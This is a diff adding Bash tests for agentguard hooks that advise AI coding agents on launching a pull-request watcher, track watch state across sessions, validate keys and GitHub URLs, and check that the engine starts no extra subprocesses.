+  _assert_eq "block: unwritable marker degrades to a reminder" 0 "$HOOK_EXIT"
+  _assert_contains "block: unwritable marker still reminds" "KEY_A" "$HOOK_STDERR"
+fi
+
+echo ""
+echo "=== stop: end to end from post-bash ==="
+
+_producer_reset
+_new_sid
+_run "$POST_BASH" claude "$(_payload "gh pr create --fill" "$URL")"
+_stop
+_assert_contains "recorded by post-bash: Stop reminds" "$URL" "$HOOK_STDERR"
+_start_watcher
+printf '%s\n' "$WATCHER_PID" >"$PRODUCER/watchers/owner_repo_12.$WATCHER_PID"
+_new_prompt
+_stop
+_assert_not_contains "recorded by post-bash: a live watcher satisfies" "$URL" "$HOOK_STDERR"
+_stop_watcher
+_producer_reset
+
+echo ""
+echo "=== pre-bash: watcher launch advice ==="
+
+PRE_BASH="$BIN_DIR/agent-hook-pre-bash"
+# Runs pre-bash for agent $1 on command $2 with run_in_background $3 and
+# prints "<exit> <foreground|detached|none>".
+_launch() {
+  local agent="$1" cmd="$2" bg="${3:-false}" kind=none
+  _new_sid
+  _run "$PRE_BASH" "$agent" "$(jq -nc --arg cmd "$cmd" --argjson bg "$bg" \
+    '{tool_input:{command:$cmd,run_in_background:$bg}}')"
+  case "$HOOK_STDERR" in
+    *'run `git pr-watch --wait` attached'*) kind=detached ;;
+    *'run `git pr-watch --wait` with run_in_background'*) kind=foreground ;;
+  esac
+  case "$HOOK_STDERR" in *"internal error"*) kind=internal-error ;; esac
+  printf '%s %s\n' "$HOOK_EXIT" "$kind"
+}
+for _case in \
+  "claude^git pr-watch --wait 12^false^0 foreground" \
+  "claude^git pr-watch --wait 12^true^0 none" \
+  "claude^git pr-watch --wait --timeout 600 https://github.com/o/r/pull/1^false^0 foreground" \
+  "claude^git-pr-watch --wait 12^false^0 foreground" \
+  "claude^/usr/local/bin/git-pr-watch --wait 12^true^0 none" \
+  "claude^cd /tmp/repo && git pr-watch --wait^false^0 foreground" \
+  "claude^git pr-watch 12^false^0 none" \
+  "claude^git pr-watch --wait --help^false^0 none" \
+  "claude^git pr-watch -h --wait^false^0 none" \
+  "claude^git pr-watch --wait 12 &^true^0 detached" \
+  "claude^nohup git pr-watch --wait 12 >/tmp/log 2>&1 &^true^0 detached" \
+  "claude^nohup git pr-watch --wait 12^true^0 detached" \
+  "claude^setsid git pr-watch --wait 12^true^0 detached" \
+  "claude^setsid -f git -C /tmp/repo pr-watch --wait 12^true^0 detached" \
+  "claude^git pr-watch --wait 12 & disown^true^0 detached" \
+  "claude^git pr-watch --wait 12 2>&1 | tee /tmp/log^true^0 none" \
+  "claude^git pr-watch --wait 12 &>/tmp/log^true^0 none" \
+  "claude^echo 'git pr-watch --wait 12 &'^false^0 none" \
+  "claude^cat /tmp/pr-watch.log^false^0 none" \
+  "claude^sed 's/&/and/' notes && git pr-watch --wait 12^true^0 none" \
+  "codex^git pr-watch --wait 12^false^0 none" \
+  "codex^git pr-watch --wait 12 &^false^0 detached" \
+  "muse^nohup git pr-watch --wait 12^false^0 detached" \
+  "gemini^git pr-watch --wait 12 &^false^0 detached" \
+  "claude^echo next: git pr-watch --wait 12^false^0 none" \
+  "claude^printf '%s\\n' run git pr-watch --wait^false^0 none" \
+  "claude^cat pr-watch.log & git pr-watch --wait 12^true^0 none" \
+  "claude^git pr-watch --wait 12 && echo ok &^true^0 detached" \
+  "claude^sleep 1 & disown; git pr-watch --wait 12^true^0 none" \
+  "claude^stdbuf -oL git pr-watch --wait 12^false^0 foreground" \
+  "claude^env A=1 nohup git-pr-watch --wait 12^true^0 detached"; do
+  IFS='^' read -r _agent _cmd _bg _want <<<"$_case"
+  _assert_eq "$_agent '$_cmd' bg=$_bg" "$_want" "$(_launch "$_agent" "$_cmd" "$_bg")"
+done
+WATCH_ENV=(AGENTGUARD_WATCH_BLOCK=1)
+_assert_eq "AGENTGUARD_WATCH_BLOCK=1: detached blocks" "2 detached" "$(_launch codex "git pr-watch --wait 12 &")"
+_assert_eq "AGENTGUARD_WATCH_BLOCK=1: foreground blocks on Claude" "2 foreground" "$(_launch claude "git pr-watch --wait 12")"
+_assert_eq "AGENTGUARD_WATCH_BLOCK=1: background attached passes" "0 none" "$(_launch claude "git pr-watch --wait 12" true)"
+_assert_eq "AGENTGUARD_WATCH_BLOCK=1: a mention in echo passes" "0 none" "$(_launch claude "echo git pr-watch --wait 12")"
+WATCH_ENV=(AGENTGUARD_WATCH=0)
+_assert_eq "AGENTGUARD_WATCH=0: no advice" "0 none" "$(_launch claude "git pr-watch --wait 12 &" true)"
+WATCH_ENV=()
+# A long line must stay well inside the classification deadline (the masking
+# used to be quadratic in the line's length).
+_long=$(printf 'a%.0s' $(seq 1 60000))
+_started=$SECONDS
+_assert_eq "60 KB launch line with an &" "0 detached" "$(_launch claude "git pr-watch --wait $_long 'x&y' &" true)"
+_assert_eq "60 KB launch line: finishes in under 20 seconds" 1 "$((SECONDS - _started < 20))"
+
+echo ""
+echo "=== engine API: a second tool with neutral keys ==="
+
+# Runs a snippet with hook-helpers and watch.sh sourced in a fresh Bash ($1)
+# whose session state dir and HOME are the test's.
+_engine() {
+  local shell="$1" snippet="$2"
+  AGENTGUARD_SESSION_ID="$SID" AGENTGUARD_NAME=claude TMPDIR="$TEST_TMPDIR" \
+    "$shell" -c '
+      set -u
+      source "$1" >/dev/null 2>&1 </dev/null
+      _hook_refresh_state_dir 2>/dev/null
+      source "$2"
+      eval "$3"
+    ' _ "$HELPERS" "$WATCH_LIB" "$snippet"
+}
+
+# Exercises the engine with tool dir $2, key $3, scope $4, and watcher name
+# $5 under shell $1.
+_engine_cases() {
+  local shell="$1" tool="$2" key="$3" scope="$4" argv="$5" label="label-$3" producer
+  local tag="$shell $tool"
+  producer="$HOME/.local/state/$tool"
+  rm -rf "$producer"
+  (umask 077 && mkdir -p "$producer/watchers" "$producer/done" "$producer/exited")
+  _new_sid
+  _assert_eq "$tag: record" 0 "$(_engine "$shell" "_hook_watch_record '$tool' '$key' '$scope' '$argv' '$label' 'Run the watcher.'; echo \$?")"
+  _assert_eq "$tag: list" "$key $scope open" "$(_engine "$shell" "_hook_watch_list '$tool'")"
+  _assert_eq "$tag: collect without a watcher" "${tool//\//_} $key" \
+    "$(_engine "$shell" '_hook_watch_collect; printf "%s\n" "${_HOOK_WATCH_UNMET[@]}"')"
+  _start_watcher "$argv"
+  printf '%s\n' "$WATCHER_PID" >"$producer/watchers/$key.$WATCHER_PID"
+  _assert_eq "$tag: collect with a live watcher" "0" \
+    "$(_engine "$shell" '_hook_watch_collect; echo ${#_HOOK_WATCH_UNMET[@]}')"
+  rm -f "$producer/watchers/$key.$WATCHER_PID"
+  printf '%s\n' "$WATCHER_PID" >"$producer/watchers/pending.$WATCHER_PID"
+  _assert_eq "$tag: collect with an unscoped pending file" "0" \
+    "$(_engine "$shell" '_hook_watch_collect; echo ${#_HOOK_WATCH_UNMET[@]}')"
+  rm -f "$producer/watchers/pending.$WATCHER_PID"
+  printf '%s\n' "$WATCHER_PID" >"$producer/watchers/pending.other-scope.$WATCHER_PID"
+  _assert_eq "$tag: another scope's pending file" "1" \
+    "$(_engine "$shell" '_hook_watch_collect; echo ${#_HOOK_WATCH_UNMET[@]}')"
+  rm -f "$producer/watchers/pending.other-scope.$WATCHER_PID"
+  _stop_watcher
+  _assert_eq "$tag: rearm ALL prints the label" "$label" "$(_engine "$shell" "_hook_watch_rearm '$tool' ALL")"
+  _assert_eq "$tag: rearm by another scope prints nothing" "" "$(_engine "$shell" "_hook_watch_rearm '$tool' nope")"
+  if [ "$scope" != - ]; then
+    _assert_eq "$tag: rearm by scope" "$label" "$(_engine "$shell" "_hook_watch_rearm '$tool' nope '$scope'")"
+  fi
+  printf -- '- closed 1\n' >"$producer/done/$key"
+  _assert_eq "$tag: list shows terminal" "$key $scope terminal" "$(_engine "$shell" "_hook_watch_list '$tool'")"
+  _assert_eq "$tag: rearm ALL skips terminal" "" "$(_engine "$shell" "_hook_watch_rearm '$tool' ALL")"
+  _assert_eq "$tag: rearm_key revives terminal" "$label" "$(_engine "$shell" "_hook_watch_rearm_key '$tool' '$key'")"
+  _assert_eq "$tag: rearm_key of an unknown key" "" "$(_engine "$shell" "_hook_watch_rearm_key '$tool' never-recorded")"
+  _assert_eq "$tag: claim block once" "0 1" "$(_engine "$shell" "_hook_watch_claim_block '$tool' '$key'; a=\$?; _hook_watch_claim_block '$tool' '$key'; echo \$a \$?")"
+  _assert_contains "$tag: stop names the custom label and hint" "label-$key. Run the watcher." \
+    "$(_engine "$shell" "_hook_watch_stop 2>&1")"
+  _assert_eq "$tag: unsafe key refused" 1 "$(_engine "$shell" "_hook_watch_record '$tool' '../x' - '$argv' l h; echo \$?")"
+  _assert_eq "$tag: unsafe tool dir refused" 1 "$(_engine "$shell" "_hook_watch_record '/abs' k - '$argv' l h; echo \$?")"
+  _assert_eq "$tag: dot-dot tool dir refused" 1 "$(_engine "$shell" "_hook_watch_record 'a/../b' k - '$argv' l h; echo \$?")"
+  _assert_eq "$tag: unsafe scope refused" 1 "$(_engine "$shell" "_hook_watch_record '$tool' k 'a/b' '$argv' l h; echo \$?")"
+  rm -rf "$producer"
+}
+
+_shells=(bash)
+# Bash 3.2 runs the Stop hook as macOS /bin/bash. Exercise the engine under it
+# when one is available (AGENTGUARD_TEST_BASH3, or a Bash 3 /bin/bash).
+_bash3="${AGENTGUARD_TEST_BASH3:-}"
+if [ -z "$_bash3" ] && [ -x /bin/bash ] && [ "$(/bin/bash -c 'echo ${BASH_VERSINFO[0]}')" = 3 ]; then
+  _bash3=/bin/bash
+fi
+[ -z "$_bash3" ] || _shells+=("$_bash3")
+for _shell in "${_shells[@]}"; do
+  _engine_cases "$_shell" example/tracker EXAMPLE-12 - example-watch
+  _engine_cases "$_shell" git-tools/pr-watch o_r_12 o_r git-pr-watch
+done
+
+_new_sid
+_assert_eq "watch-github: key and scope from a URL" "owner_repo.js_42 owner_repo.js" \
+  "$(_engine bash "source '$WATCH_GH_LIB'; _hook_gh_pr_key_scope https://github.com/Owner/Repo.JS/pull/42")"
+for _bad in http://user@github.com/o/r/pull/1 https://github.com:8443/o/r/pull/1 \
+  https://github.com/o/r/issues/1 https://github.com/o/r/pull/01 https://github.com/o/pull/1 \
+  'https://github.com/o/r$x/pull/1' ftp://github.com/o/r/pull/1; do
+  _assert_eq "watch-github: rejects $_bad" 1 \
+    "$(_engine bash "source '$WATCH_GH_LIB'; _hook_gh_pr_key_scope '$_bad' >/dev/null; echo \$?")"
+done
+_assert_eq "watch-github: push scopes ALL for no output" "ALL" \
+  "$(_engine bash "source '$WATCH_GH_LIB'; _hook_gh_push_scopes '' 'git push'")"
+_assert_eq "watch-github: inert command" "" \
+  "$(_engine bash "source '$WATCH_GH_LIB'; _hook_gh_push_scopes '' 'git push --dry-run'")"
+
+echo ""
+echo "=== engine: no added subprocesses ==="
+
+# Trace with the shell pid in PS4: a subshell or external command would show
+# up as another pid or an unknown command word. Exactly one pid and no
+# external command proves the snippet ran in the caller's shell.
+_forks_for() {
+  AGENTGUARD_SESSION_ID="$SID" AGENTGUARD_NAME=claude TMPDIR="$TEST_TMPDIR" \
+    PATH="$WITH_WATCH_PATH" bash -c '
+      source "$1" >/dev/null 2>&1 </dev/null
+      _hook_refresh_state_dir 2>/dev/null
+      source "$2"
+      source "$3"
+      trace=$(mktemp)
+      exec 9>"$trace"
+      BASH_XTRACEFD=9
+      PS4="+\$BASHPID "
+      set -x
+      eval "$4"
+      set +x
+      exec 9>&-
+      pids=$(sed -n "s/^+* *\([0-9][0-9]*\) .*/\1/p" "$trace" | sort -u | wc -l | tr -d " ")
+      externals=0
+      while read -r word _; do
+        case "$(type -t "$word" 2>/dev/null)" in file) externals=$((externals + 1)) ;; esac
+      done < <(sed -n "s/^+* *[0-9][0-9]* //p" "$trace")
+      rm -f "$trace"
+      echo "$pids $externals"
+    ' _ "$HELPERS" "$WATCH_LIB" "$WATCH_GH_LIB" "$1"
+}
+
+_new_sid
+_assert_eq "stop gate without watch state: no subprocess" "1 0" \
+  "$(_forks_for '[ -d "$_HOOK_STATE_DIR/watch" ] && _hook_watch_stop')"
+_producer_reset
+_seed_key o_r_12 1000 o_r KEY_A
+printf '%s green 1001\n' "$_commit" >"$PRODUCER/done/o_r_12"
+if [ -r /proc/self/cmdline ]; then
+  _start_watcher
+  _seed_key o_r_13 1000 o_r KEY_B
+  printf '%s\n' "$WATCHER_PID" >"$PRODUCER/watchers/o_r_13.$WATCHER_PID"
+  _assert_eq "collect with satisfied keys: no subprocess" "1 0" "$(_forks_for '_hook_watch_collect')"
+  _assert_eq "collect with satisfied keys: nothing unmet" "0" \
+    "$(_engine bash '_hook_watch_collect; echo ${#_HOOK_WATCH_UNMET[@]}')"
+  _stop_watcher
+fi
+_producer_reset
+
+_test_summary
